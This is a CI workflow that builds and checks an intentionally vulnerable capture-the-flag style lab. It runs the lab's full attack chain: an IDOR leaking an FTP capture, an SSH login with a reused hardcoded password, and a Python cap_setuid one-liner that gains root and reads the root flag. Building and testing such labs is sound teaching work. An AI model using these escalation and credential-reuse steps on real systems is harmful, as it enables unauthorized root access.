name: Cap IDOR and Python capabilities lab

on:
  push:
    branches: ["release/verified-cap-photobomb-bashed", "main"]
    paths:
      - "labs/cap/**"
      - ".github/workflows/cap.yml"
  pull_request:
    paths:
      - "labs/cap/**"
      - ".github/workflows/cap.yml"
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.ref_name }}
  cancel-in-progress: true

jobs:
  cap:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
      - name: Build Python 3.8, real FTP capture and Cap target
        run: docker build --progress=plain -f labs/cap/Dockerfile -t ttp-cap:ci labs/cap
      - name: Measure compact image
        run: |
          set -euo pipefail
          bytes=$(docker image inspect -f '{{.Size}}' ttp-cap:ci)
          awk -v b="$bytes" 'BEGIN {printf "Cap image: %.1f MiB (%d bytes)\n",b/1048576,b}'
          test "$bytes" -le $((120 * 1048576))
      - name: Verify real IDOR, FTP password reuse, SSH and cap_setuid
        run: |
          set -euo pipefail
          docker build --progress=plain -f labs/cap/tests/Dockerfile.ssh-attacker -t ttp-cap-ssh-attacker:ci labs/cap/tests
          net=cap-ci
          target=cap-target
          cleanup() {
            docker logs --tail 140 "$target" || true
            docker rm -f "$target" >/dev/null 2>&1 || true
            docker rm -f cap-other >/dev/null 2>&1 || true
            docker network rm "$net" >/dev/null 2>&1 || true
          }
          docker network create --internal "$net"
          trap cleanup EXIT
          start_target() {
            docker run -d --name "$target" --network "$net" \
              --memory 128m --pids-limit 128 --cpus 1 \
              -e CAP_REQUIRE_PRIVATE_FLAGS=1 \
              -e CAP_STATIC_USER_FLAG='TTP{cap_ci_private_user_0123456789}' \
              -e CAP_STATIC_ROOT_FLAG='TTP{cap_ci_private_root_0123456789}' \
              ttp-cap:ci
          }
          wait_healthy() {
            for i in $(seq 1 60); do
              state=$(docker inspect -f '{{.State.Status}}' "$target")
              if [ "$state" != running ]; then docker logs "$target"; return 1; fi
              health=$(docker inspect -f '{{.State.Health.Status}}' "$target")
              if [ "$health" = healthy ]; then return 0; fi
              if [ "$health" = unhealthy ]; then docker logs "$target"; return 1; fi
              sleep 2
            done
            docker logs "$target"; return 1
          }
          start_target
          wait_healthy
          docker run --rm --network "$net" \
            -v "$PWD/labs/cap/tests:/tests:ro" \
            python:3.12-alpine python /tests/attack_path.py
          docker run --rm --network "$net" ttp-cap-ssh-attacker:ci sh -c \
            'sshpass -p "Buck3tH4TF0RM3!" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=6 nathan@cap-target "id -un" | grep -Fx nathan'
          docker exec -u nathan "$target" sh -c \
            'test "$(id -u)" = 1000; test -r /home/nathan/user.txt; test ! -r /root/root.txt'
          docker exec "$target" getcap /usr/bin/python3.8 | grep -q cap_setuid
          docker exec -u nathan "$target" /usr/bin/python3.8 -c \
            'import os; os.setuid(0); assert os.geteuid()==0; print(open("/root/root.txt").read().strip())' \
            | grep -Fx 'TTP{cap_ci_private_root_0123456789}'
          docker stats --no-stream --format 'Target memory: {{.MemUsage}}, PIDs: {{.PIDs}}' "$target"
          docker run -d --name cap-other --network "$net" --memory 128m --pids-limit 128 --cpus 1 \
            -e CAP_REQUIRE_PRIVATE_FLAGS=1 \
            -e CAP_STATIC_USER_FLAG='TTP{cap_other_user_0123456789}' \
            -e CAP_STATIC_ROOT_FLAG='TTP{cap_other_root_0123456789}' ttp-cap:ci
          docker exec "$target" test -f /pcaps/1.pcap
          docker exec cap-other sh -c 'test ! -e /pcaps/1.pcap'
          docker rm -f "$target"
          start_target
          wait_healthy
          docker run --rm --network "$net" \
            -v "$PWD/labs/cap/tests:/tests:ro" \
            python:3.12-alpine python /tests/reset_path.py
          docker exec "$target" sh -c \
            'test "$(cat /root/root.txt)" = "TTP{cap_ci_private_root_0123456789}"; test ! -e /pcaps/1.pcap'
          echo 'PASS: real FTP PCAP -> IDOR -> SSH password reuse -> Python cap_setuid UID0 -> isolation + reset'
